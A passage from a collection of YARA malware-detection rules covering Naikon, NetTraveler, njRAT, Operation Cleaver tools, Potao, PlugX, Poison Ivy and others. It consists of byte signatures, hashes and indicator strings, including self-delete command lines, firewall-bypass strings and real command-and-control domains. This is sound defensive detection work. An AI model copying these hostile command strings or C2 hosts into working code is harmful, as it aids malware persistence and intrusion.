        last_modified = "2014-06-25"
    
    strings:
        // decryption
        $ = { 0F AF C1 C1 E0 1F } // imul eax, ecx; shl eah, 1fh
        $ = { 35 5A 01 00 00} // xor eax, 15ah
        $ = { 81 C2 7F 14 06 00 } // add edx, 6147fh
    
    condition:
        all of them
}

rule NaikonStrings : Naikon Family
{
    meta:
        description = "Naikon Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        $ = "NOKIAN95/WEB"
        $ = "/tag=info&id=15"
        $ = "skg(3)=&3.2d_u1"
        $ = "\\Temp\\iExplorer.exe"
        $ = "\\Temp\\\"TSG\""
        
    condition:
       any of them
}

rule Naikon : Family
{
    meta:
        description = "Naikon"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    condition:
        NaikonCode or NaikonStrings
}
rule Backdoor_Naikon_APT_Sample1 {
	meta:
		description = "Detects backdoors related to the Naikon APT"
		author = "Florian Roth"
		reference = "https://goo.gl/7vHyvh"
		date = "2015-05-14"
		hash = "d5716c80cba8554eb79eecfb4aa3d99faf0435a1833ec5ef51f528146c758eba"
		hash = "f5ab8e49c0778fa208baad660fe4fa40fc8a114f5f71614afbd6dcc09625cb96"
	strings:
		$x0 = "GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1" fullword ascii
		$x1 = "POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1" fullword ascii
		$x2 = "greensky27.vicp.net" fullword ascii
		$x3 = "\\tempvxd.vxd.dll" fullword wide
		$x4 = "otna.vicp.net" fullword ascii
		$x5 = "smithking19.gicp.net" fullword ascii
		
		$s1 = "User-Agent: webclient" fullword ascii
		$s2 = "\\User.ini" fullword ascii
		$s3 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/200" ascii
		$s4 = "\\UserProfile.dll" fullword wide
		$s5 = "Connection:Keep-Alive: %d" fullword ascii
		$s6 = "Referer: http://%s:%d/" fullword ascii
		$s7 = "%s %s %s %d %d %d " fullword ascii
		$s8 = "%s--%s" fullword wide
		$s9 = "Run File Success!" fullword wide
		$s10 = "DRIVE_REMOTE" fullword wide
		$s11 = "ProxyEnable" fullword wide
		$s12 = "\\cmd.exe" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and
		(
			1 of ($x*) or 7 of ($s*)
		)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule nAspyUpdateCode : nAspyUpdate Family 
{
    meta:
        description = "nAspyUpdate code features"
        author = "Seth Hardy"
        last_modified = "2014-07-14"
    
    strings:
        // decryption loop in dropper
        $ = { 8A 54 24 14 8A 01 32 C2 02 C2 88 01 41 4E 75 F4 }
        
    condition:
        any of them
}

rule nAspyUpdateStrings : nAspyUpdate Family
{
    meta:
        description = "nAspyUpdate Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-14"
        
    strings:
        $ = "\\httpclient.txt"
        $ = "password <=14"
        $ = "/%ldn.txt"
        $ = "Kill You\x00"
        
    condition:
        any of them
}

rule nAspyUpdate : Family
{
    meta:
        description = "nAspyUpdate"
        author = "Seth Hardy"
        last_modified = "2014-07-14"
        
    condition:
        nAspyUpdateCode or nAspyUpdateStrings
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule NetpassStrings : NetPass Variant {

        meta:
                description = "Identifiers for netpass variant"
                author = "Katie Kleemola"
                last_updated = "2014-05-29"

        strings:
                $exif1 = "Device Protect ApplicatioN" wide
                $exif2 = "beep.sys" wide //embedded exe name
                $exif3 = "BEEP Driver" wide //embedded exe description

                $string1 = "\x00NetPass Update\x00"
                $string2 = "\x00%s:DOWNLOAD\x00"
                $string3 = "\x00%s:UPDATE\x00"
                $string4 = "\x00%s:uNINSTALL\x00"

        condition:
                all of ($exif*) or any of ($string*)

}

rule NetPass : Variant {
        meta:
                description = "netpass variant"
                author = "Katie Kleemola"
                last_updated = "2014-07-08"
        condition:
                NetpassStrings
}

rule NetTravStrings : NetTraveler Family {


	meta:
        	description = "Identifiers for NetTraveler DLL"
		author = "Katie Kleemola"
        	last_updated = "2014-05-20"

	strings:
		//network strings
		$ = "?action=updated&hostid="
		$ = "travlerbackinfo"
		$ = "?action=getcmd&hostid="
		$ = "%s?action=gotcmd&hostid="
		$ = "%s?hostid=%s&hostname=%s&hostip=%s&filename=%s&filestart=%u&filetext="

		//debugging strings
		$ = "\x00Method1 Fail!!!!!\x00"
		$ = "\x00Method3 Fail!!!!!\x00"
		$ = "\x00method currect:\x00"
		$ = /\x00\x00[\w\-]+ is Running!\x00\x00/
		$ = "\x00OtherTwo\x00"

	condition:
		any of them

}

rule NetTravExports : NetTraveler Family {

	meta:
		description = "Export names for dll component"
		author = "Katie Kleemola"
		last_updated = "2014-05-20"
	
	strings:
		//dll component exports
		$ = "?InjectDll@@YAHPAUHWND__@@K@Z"
		$ = "?UnmapDll@@YAHXZ"
		$ = "?g_bSubclassed@@3HA"
		
	condition:
		any of them
}

rule NetTraveler : Family {
	meta:
		description = "Nettravelr"
		author = "Katie Kleemola"
		last_updated = "2014-07-08"
	
	condition:
		NetTravExports or NetTravStrings or NetpassStrings

}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"
rule NetWiredRC_B : rat 
{
	meta:
		description = "NetWiredRC"
		author = "Jean-Philippe Teissier / @Jipe_"
		date = "2014-12-23"
		filetype = "memory"
		version = "1.1" 

	strings:
		$mutex = "LmddnIkX"

		$str1 = "%s.Identifier"
		$str2 = "%d:%I64u:%s%s;"
		$str3 = "%s%.2d-%.2d-%.4d"
		$str4 = "[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]"
		$str5 = "%.2d/%.2d/%d %.2d:%.2d:%.2d"
		
		$klg1 = "[Backspace]"
		$klg2 = "[Enter]"
		$klg3 = "[Tab]"
		$klg4 = "[Arrow Left]"
		$klg5 = "[Arrow Up]"
		$klg6 = "[Arrow Right]"
		$klg7 = "[Arrow Down]"
		$klg8 = "[Home]"
		$klg9 = "[Page Up]"
		$klg10 = "[Page Down]"
		$klg11 = "[End]"
		$klg12 = "[Break]"
		$klg13 = "[Delete]"
		$klg14 = "[Insert]"
		$klg15 = "[Print Screen]"
		$klg16 = "[Scroll Lock]"
		$klg17 = "[Caps Lock]"
		$klg18 = "[Alt]"
		$klg19 = "[Esc]"
		$klg20 = "[Ctrl+%c]"

	condition: 
		$mutex or (1 of ($str*) and 1 of ($klg*))
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Njrat
{
    meta:
        description = "Njrat"
	author = "botherder https://github.com/botherder"

    strings:
        $string1 = /(F)romBase64String/
        $string2 = /(B)ase64String/
        $string3 = /(C)onnected/ wide ascii
        $string4 = /(R)eceive/
        $string5 = /(S)end/ wide ascii
        $string6 = /(D)ownloadData/ wide ascii
        $string7 = /(D)eleteSubKey/ wide ascii
        $string8 = /(g)et_MachineName/
        $string9 = /(g)et_UserName/
        $string10 = /(g)et_LastWriteTime/
        $string11 = /(G)etVolumeInformation/
        $string12 = /(O)SFullName/ wide ascii
        $string13 = /(n)etsh firewall/ wide
        $string14 = /(c)md\.exe \/k ping 0 & del/ wide
        $string15 = /(c)md\.exe \/c ping 127\.0\.0\.1 & del/ wide
        $string16 = /(c)md\.exe \/c ping 0 -n 2 & del/ wide
        $string17 = {7C 00 27 00 7C 00 27 00 7C}

    condition:
        10 of them
}
rule njrat1
{
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2015-05-27"
        description = "Identify njRat"
    strings:
        $a1 = "netsh firewall add allowedprogram " wide
        $a2 = "SEE_MASK_NOZONECHECKS" wide

        $b1 = "[TAP]" wide
        $b2 = " & exit" wide

        $c1 = "md.exe /k ping 0 & del " wide
        $c2 = "cmd.exe /c ping 127.0.0.1 & del" wide
        $c3 = "cmd.exe /c ping" wide
    condition:
        1 of ($a*) and 1 of ($b*) and 1 of ($c*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule TROJAN_Notepad {
    meta:
        Author = "RSA_IR"
        Date     = "4Jun13"
        File     = "notepad.exe v 1.1"
        MD5      = "106E63DBDA3A76BEEB53A8BBD8F98927"
    strings:
        $s1 = "75BAA77C842BE168B0F66C42C7885997"
        $s2 = "B523F63566F407F3834BCC54AAA32524"
    condition:
        $s1 or $s2
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule NSFreeCode : NSFree Family 
{
    meta:
        description = "NSFree code features"
        author = "Seth Hardy"
        last_modified = "2014-06-24"
    
    strings:
        // push vars then look for MZ
        $ = { 53 56 57 66 81 38 4D 5A }
        // nops then look for PE\0\0
        $ = { 90 90 90 90 81 3F 50 45 00 00 }
    
    condition:
        all of them
}

rule NSFreeStrings : NSFree Family
{
    meta:
        description = "NSFree Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-24"
        
    strings:
        $ = "\\MicNS\\" nocase
        $ = "NSFreeDll" wide ascii
        // xor 0x58 dos stub
        $ = { 0c 30 31 2b 78 28 2a 37 3f 2a 39 35 78 3b 39 36 36 37 }
        
    condition:
       any of them
}

rule NSFree : Family
{
    meta:
        description = "NSFree"
        author = "Seth Hardy"
        last_modified = "2014-06-24"
        
    condition:
        NSFreeCode or NSFreeStrings
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule OlyxCode : Olyx Family 
{
    meta:
        description = "Olyx code tricks"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    strings:
        $six = { C7 40 04 36 36 36 36 C7 40 08 36 36 36 36 }
        $slash = { C7 40 04 5C 5C 5C 5C C7 40 08 5C 5C 5C 5C }
        
    condition:
        any of them
}

rule OlyxStrings : Olyx Family
{
    meta:
        description = "Olyx Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    strings:
        $ = "/Applications/Automator.app/Contents/MacOS/DockLight"
       
    condition:
        any of them
}

rule Olyx : Family
{
    meta:
        description = "Olyx"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    condition:
        OlyxCode or OlyxStrings
}
rule OpClandestineWolf

{
 
   meta:
        alert_severity = "HIGH"
        log = "false"
        author = "NDF"
        weight = 10
        alert = true
        source = " https://www.fireeye.com/blog/threat-research/2015/06/operation-clandestine-wolf-adobe-flash-zero-day.html"
        version = 1
	date = "2015-06-23"
	description = "Operation Clandestine Wolf signature based on OSINT from 06.23.15"
	hash0 = "1a4b710621ef2e69b1f7790ae9b7a288"
	hash1 = "917c92e8662faf96fffb8ffe7b7c80fb"
	hash2 = "975b458cb80395fa32c9dda759cb3f7b"
	hash3 = "3ed34de8609cd274e49bbd795f21acc4"
	hash4 = "b1a55ec420dd6d24ff9e762c7b753868"
	hash5 = "afd753a42036000ad476dcd81b56b754"
	hash6 = "fad20abf8aa4eda0802504d806280dd7"
	hash7 = "ab621059de2d1c92c3e7514e4b51751a"
	hash8 = "510b77a4b075f09202209f989582dbea"
	hash9 = "d1b1abfcc2d547e1ea1a4bb82294b9a3"
	hash10 = "4692337bf7584f6bda464b9a76d268c1"
	hash11 = "7cae5757f3ba9fef0a22ca0d56188439"
	hash12 = "1a7ba923c6aa39cc9cb289a17599fce0"
	hash13 = "f86db1905b3f4447eb5728859f9057b5"
	hash14 = "37c6d1d3054e554e13d40ea42458ebed"
	hash15 = "3e7430a09a44c0d1000f76c3adc6f4fa"
	hash16 = "98eb249e4ddc4897b8be6fe838051af7"
	hash17 = "1b57a7fad852b1d686c72e96f7837b44"
	hash18 = "ffb84b8561e49a8db60e0001f630831f"
	hash19 = "98eb249e4ddc4897b8be6fe838051af7"
	hash20 = "dfb4025352a80c2d81b84b37ef00bcd0"
	hash21 = "4457e89f4aec692d8507378694e0a3ba"
	hash22 = "48de562acb62b469480b8e29821f33b8"
	hash23 = "7a7eed9f2d1807f55a9308e21d81cccd"
	hash24 = "6817b29e9832d8fd85dcbe4af176efb6"

   strings:
	$s0 = "flash.Media.Sound()"
	$s1 = "call Kernel32!VirtualAlloc(0x1f140000hash$=0x10000hash$=0x1000hash$=0x40)"
	$s2 = "{4D36E972-E325-11CE-BFC1-08002BE10318}"
	$s3 = "NetStream"

	condition:
		all of them
}



/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


rule OPCLEAVER_BackDoorLogger
{
	meta:
		description = "Keylogger used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "BackDoorLogger"
		$s2 = "zhuAddress"
	condition:
		all of them
}

rule OPCLEAVER_Jasus
{
	meta:
		description = "ARP cache poisoner used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "pcap_dump_open"
		$s2 = "Resolving IPs to poison..."
		$s3 = "WARNNING: Gateway IP can not be found"
	condition:
		all of them
}

rule OPCLEAVER_LoggerModule
{
	meta:
		description = "Keylogger used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "%s-%02d%02d%02d%02d%02d.r"
		$s2 = "C:\\Users\\%s\\AppData\\Cookies\\"
	condition:
		all of them
}

rule OPCLEAVER_NetC
{
	meta:
		description = "Net Crawler used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "NetC.exe" wide
		$s2 = "Net Service"
	condition:
		all of them
}

rule OPCLEAVER_ShellCreator2
{
	meta:
		description = "Shell Creator used by attackers in Operation Cleaver to create ASPX web shells"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "ShellCreator2.Properties"
		$s2 = "set_IV"
	condition:
		all of them
}

rule OPCLEAVER_SmartCopy2
{
	meta:
		description = "Malware or hack tool used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "SmartCopy2.Properties"
		$s2 = "ZhuFrameWork"
	condition:
		all of them
}

rule OPCLEAVER_SynFlooder
{
	meta:
		description = "Malware or hack tool used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "Unable to resolve [ %s ]. ErrorCode %d"
		$s2 = "your target’s IP is : %s"
		$s3 = "Raw TCP Socket Created successfully."
	condition:
		all of them
}

rule OPCLEAVER_TinyZBot
{
	meta:
		description = "Tiny Bot used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "NetScp" wide
		$s2 = "TinyZBot.Properties.Resources.resources"
		$s3 = "Aoao WaterMark"
		$s4 = "Run_a_exe"
		$s5 = "netscp.exe"
		$s6 = "get_MainModule_WebReference_DefaultWS"
		$s7 = "remove_CheckFileMD5Completed"
		$s8 = "http://tempuri.org/"
		$s9 = "Zhoupin_Cleaver"
	condition:
		(($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or $s9)
}

rule OPCLEAVER_ZhoupinExploitCrew
{
	meta:
		description = "Keywords used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "zhoupin exploit crew" nocase
		$s2 = "zhopin exploit crew" nocase
	condition:
		1 of them
}

rule OPCLEAVER_antivirusdetector
{
	meta:
		description = "Hack tool used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "getShadyProcess"
		$s2 = "getSystemAntiviruses"
		$s3 = "AntiVirusDetector"
	condition:
		all of them
}

rule OPCLEAVER_csext
{
	meta:
		description = "Backdoor used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "COM+ System Extentions"
		$s2 = "csext.exe"
		$s3 = "COM_Extentions_bin"
	condition:
		all of them
}

rule OPCLEAVER_kagent
{
	meta:
		description = "Backdoor used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "kill command is in last machine, going back"
		$s2 = "message data length in B64: %d Bytes"
	condition:
		all of them
}

rule OPCLEAVER_mimikatzWrapper
{
	meta:
		description = "Mimikatz Wrapper used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "mimikatzWrapper"
		$s2 = "get_mimikatz"
	condition:
		all of them
}

rule OPCLEAVER_pvz_in
{
	meta:
		description = "Parviz tool used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "LAST_TIME=00/00/0000:00:00PM$"
		$s2 = "if %%ERRORLEVEL%% == 1 GOTO line"
	condition:
		all of them
}

rule OPCLEAVER_pvz_out
{
	meta:
		description = "Parviz tool used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "Network Connectivity Module" wide
		$s2 = "OSPPSVC" wide
	condition:
		all of them
}

rule OPCLEAVER_wndTest
{
	meta:
		description = "Backdoor used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "[Alt]" wide
		$s2 = "<< %s >>:" wide
		$s3 = "Content-Disposition: inline; comp=%s; account=%s; product=%d;"
	condition:
		all of them
}

rule OPCLEAVER_zhCat
{
	meta:
		description = "Network tool used by Iranian hackers and used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "Mozilla/4.0 ( compatible; MSIE 7.0; AOL 8.0 )" ascii fullword
		$s2 = "ABC ( A Big Company )" wide fullword
	condition:
		all of them
}

rule OPCLEAVER_zhLookUp
{
	meta:
		description = "Hack tool used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "zhLookUp.Properties"
	condition:
		all of them
}

rule OPCLEAVER_zhmimikatz
{
	meta:
		description = "Mimikatz wrapper used by attackers in Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Cylance Inc."
		score = "70"
	strings:
		$s1 = "MimikatzRunner"
		$s2 = "zhmimikatz"
	condition:
		all of them
}

rule OPCLEAVER_Parviz_Developer
{
	meta:
		description = "Parviz developer known from Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Florian Roth"
		score = "70"
	strings:
		$s1 = "Users\\parviz\\documents\\" nocase
	condition:
		$s1 
}

rule OPCLEAVER_CCProxy_Config
{
	meta:
		description = "CCProxy config known from Operation Cleaver"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		date = "2014/12/02"
		author = "Florian Roth"
		score = "70"
	strings:
		$s1 = "UserName=User-001" fullword ascii
		$s2 = "Web=1" fullword ascii
		$s3 = "Mail=1" fullword ascii
		$s4 = "FTP=0" fullword ascii
		$x1 = "IPAddressLow=78.109.194.114" fullword ascii
	condition:
		all of ($s*) or $x1 
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
// Operation Potao yara rules
// For feedback or questions contact us at: github@eset.com
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2015, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
private rule PotaoDecoy
{
    strings:
        $mz = { 4d 5a }
        $str1 = "eroqw11"
        $str2 = "2sfsdf"
        $str3 = "RtlDecompressBuffer"
        $wiki_str = "spanned more than 100 years and ruined three consecutive" wide

        $old_ver1 = {53 68 65 6C 6C 33 32 2E 64 6C 6C 00 64 61 66 73 72 00 00 00 64 61 66 73 72 00 00 00 64 6F 63 (00 | 78)}
        $old_ver2 = {6F 70 65 6E 00 00 00 00 64 6F 63 00 64 61 66 73 72 00 00 00 53 68 65 6C 6C 33 32 2E 64 6C 6C 00}       
    condition:
        ($mz at 0) and ( (all of ($str*)) or any of ($old_ver*) or $wiki_str )
}
private rule PotaoDll
{
    strings:
        $mz = { 4d 5a }
        
        $dllstr1 = "?AVCncBuffer@@"
        $dllstr2 = "?AVCncRequest@@"
        $dllstr3 = "Petrozavodskaya, 11, 9"
        $dllstr4 = "_Scan@0"
        $dllstr5 = "\x00/sync/document/"
        $dllstr6 = "\\temp.temp"
        
        $dllname1 = "node69MainModule.dll"
        $dllname2 = "node69-main.dll"
        $dllname3 = "node69MainModuleD.dll"
        $dllname4 = "task-diskscanner.dll"
        $dllname5 = "\x00Screen.dll"
        $dllname6 = "Poker2.dll"        
        $dllname7 = "PasswordStealer.dll"
        $dllname8 = "KeyLog2Runner.dll" 
        $dllname9 = "GetAllSystemInfo.dll"          
        $dllname10 = "FilePathStealer.dll"          
    condition:
        ($mz at 0) and (any of ($dllstr*) and any of ($dllname*))
}
private rule PotaoUSB
{
    strings:
        $mz = { 4d 5a }
        
        $binary1 = { 33 C0 8B C8 83 E1 03 BA ?? ?? ?? 00 2B D1 8A 0A 32 88 ?? ?? ?? 00 2A C8 FE C9 88 88 ?? ?? ?? 00 40 3D ?? ?? 00 00 7C DA C3 }
        $binary2 = { 55 8B EC 51 56 C7 45 FC 00 00 00 00 EB 09 8B 45 FC 83 C0 01 89 45 FC 81 7D FC ?? ?? 00 00 7D 3D 8B 4D FC 0F BE 89 ?? ?? ?? 00 8B 45 FC 33 D2 BE 04 00 00 00 F7 F6 B8 03 00 00 00 2B C2 0F BE 90 ?? ?? ?? 00 33 CA 2B 4D FC 83 E9 01 81 E1 FF 00 00 00 8B 45 FC 88 88 ?? ?? ?? 00 EB B1 5E 8B E5 5D C3}
    condition:
        ($mz at 0) and any of ($binary*)
}
private rule PotaoSecondStage
{
    strings:
        $mz = { 4d 5a }
        // hash of CryptBinaryToStringA and CryptStringToBinaryA
        $binary1 = {51 7A BB 85 [10-180] E8 47 D2 A8}
        // old hash of CryptBinaryToStringA and CryptStringToBinaryA
        $binary2 = {5F 21 63 DD [10-30] EC FD 33 02}
        $binary3 = {CA 77 67 57 [10-30] BA 08 20 7A}
        
        $str1 = "?AVCrypt32Import@@"
        $str2 = "%.5llx"
    condition:
        ($mz at 0) and any of ($binary*) and any of ($str*)
}
rule Potao
{
    meta:
        Author      = "Anton Cherepanov"
        Date        = "2015/07/29"
        Description = "Operation Potao"
        Reference   = "http://www.welivesecurity.com/wp-content/uploads/2015/07/Operation-Potao-Express_final_v2.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "threatintel@eset.com"
        License = "BSD 2-Clause"
    condition:
        PotaoDecoy or PotaoDll or PotaoUSB or PotaoSecondStage
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule PlugXStrings : PlugX Family
{
    meta:
        description = "PlugX Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-12"
        
    strings:
        $BootLDR = "boot.ldr" wide ascii
        $Dwork = "d:\\work" nocase
        $Plug25 = "plug2.5"
        $Plug30 = "Plug3.0"
        $Shell6 = "Shell6"
      
    condition:
        $BootLDR or ($Dwork and ($Plug25 or $Plug30 or $Shell6))
}

rule plugX : rat
{
	meta:
		author = "Jean-Philippe Teissier / @Jipe_"
		description = "PlugX RAT"
		date = "2014-05-13"
		filetype = "memory"
		version = "1.0" 
		ref1 = "https://github.com/mattulm/IR-things/blob/master/volplugs/plugx.py"
		
	strings:
		$v1a = { 47 55 4C 50 00 00 00 00 }
		$v1b = "/update?id=%8.8x" 
		$v1algoa = { BB 33 33 33 33 2B } 
		$v1algob = { BB 44 44 44 44 2B } 
		$v2a = "Proxy-Auth:" 
		$v2b = { 68 A0 02 00 00 } 
		$v2k = { C1 8F 3A 71 } 
		
	condition: 
		$v1a at 0 or $v1b or (($v2a or $v2b) and (($v1algoa and $v1algob) or $v2k))
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule poisonivy_1 : rat
{
	meta:
		description = "Poison Ivy"
		author = "Jean-Philippe Teissier / @Jipe_"
		date = "2013-02-01"
		filetype = "memory"
		version = "1.0" 
		ref1 = "https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py"

	strings:
		$a = { 53 74 75 62 50 61 74 68 ?? 53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C 6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22] 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63 74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20 43 6F 6D 70 6F 6E 65 6E 74 73 5C } 
		
	condition:
		$a
}

rule PoisonIvy_Generic_3 {
	meta:
		description = "PoisonIvy RAT Generic Rule"
		author = "Florian Roth"
		date = "2015-05-14"
		hash = "e1cbdf740785f97c93a0a7a01ef2614be792afcd"
	strings:
		$k1 = "Tiger324{" fullword ascii
		
		$s2 = "WININET.dll" fullword ascii
		$s3 = "mscoree.dll" fullword wide
		$s4 = "WS2_32.dll" fullword
		$s5 = "Explorer.exe" fullword wide
		$s6 = "USER32.DLL"
		$s7 = "CONOUT$"
		$s8 = "login.asp"
		
		$h1 = "HTTP/1.0"
		$h2 = "POST"
		$h3 = "login.asp"
		$h4 = "check.asp"
		$h5 = "result.asp"
		$h6 = "upload.asp"
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and
			( 
				$k1 or all of ($s*) or all of ($h*)
			)
}
rule PoisonIvy_2
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
